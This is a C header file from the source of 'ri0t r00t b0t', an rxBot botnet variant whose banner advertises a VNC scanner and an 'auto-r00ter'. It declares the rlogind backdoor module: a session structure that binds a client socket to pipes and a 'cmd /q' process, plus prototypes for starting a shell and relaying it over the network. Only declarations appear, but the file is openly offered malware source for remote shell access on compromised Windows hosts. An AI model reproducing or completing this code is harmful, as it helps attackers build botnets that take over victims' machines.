/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_RLOGIND

#define BUFFER_SIZE 200
#define SHELL_COMMAND_LINE  TEXT("cmd /q")

#define CHAR_BS		0010
#define CHAR_DEL	0177
#define CHAR_CTRL_C	0003
#define CHAR_CTRL_U	0025

typedef struct SESSION_DATA 
{
    HANDLE ReadPipeHandle;
    HANDLE WritePipeHandle;
    HANDLE ProcessHandle;
    SOCKET ClientSocket;
    HANDLE ReadShellThreadHandle;
    HANDLE WriteShellThreadHandle;

} SESSION_DATA, *PSESSION_DATA;

static PSESSION_DATA CreateSession(int threadnum);
BOOL SessionRun(int threadnum);
static HANDLE StartShell(HANDLE ShellStdinPipeHandle, HANDLE ShellStdoutPipeHandle, int threadnum);
static void SessionReadShellThread(LPVOID param);
static void SessionWriteShellThread(LPVOID param);
#endif
